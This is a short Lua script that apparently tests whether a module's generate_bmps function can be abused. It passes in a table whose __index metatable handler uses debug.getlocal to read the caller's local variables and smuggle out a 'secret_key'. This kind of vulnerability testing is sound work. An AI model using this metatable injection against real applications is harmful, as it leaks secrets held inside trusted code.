local code = require("code")

local malicous_code_executed = false

local malicous_metatable = {
    __index = function(og_table, index)
        print("[SCRIPT EXECUTING]")
        malicous_code_executed = true
        local variables = {}
        local idx = 1
        while true do
            local ln, lv = debug.getlocal(2, idx)
            if ln ~= nil then
                variables[ln] = lv
            else
                break
            end
            idx = 1 + idx
        end

        og_table.recieving_payload = variables["secret_key"]

        return "Get PWNED"
    end
}

local odd_request = { { source = "Legit link", image = nil }, nil, { source = "Another legit link", image = nil } }
local malicous_metatable = setmetatable(odd_request, malicous_metatable)
local result = code.generate_bmps(malicous_metatable)

setmetatable(result, {})
if result.recieving_payload ~= nil then
    print("Malicous payload recieved: ", result.recieving_payload)
end

print(malicous_code_executed)
